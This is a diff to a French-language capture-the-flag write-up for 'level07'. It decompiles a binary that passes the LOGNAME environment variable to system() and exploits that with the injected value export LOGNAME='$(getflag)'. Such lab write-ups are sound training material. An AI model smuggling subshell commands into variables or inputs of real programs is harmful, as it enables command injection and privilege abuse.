@@ -1,5 +1,12 @@
+# Level07
+
+[ENGLISH version](README_EN.md)
+
+## Comment récuperer le flag
+
 En décompilant level07, voici son code source:
 
+```
 void main(void)
 {
     undefined4 uVar1;
@@ -17,7 +24,7 @@ void main(void)
     system(uStack28);
     return;
 }
-
+```
 
 On peut voir que le programme récupère le contenu de la variable d'environnement LOGNAME, puis l'affiche.
 
@@ -25,6 +32,11 @@ On ne peut pas ici utiliser de lien symbolique car echo est appelé directement 
 
 Il suffit alors juste d'utiliser un sous shell
 
+```
 export LOGNAME='$(getflag)'
-
 ./level07
+```
+
+## Le flag
+
+Le flag lu est celui utilisable pour se connecter a level06
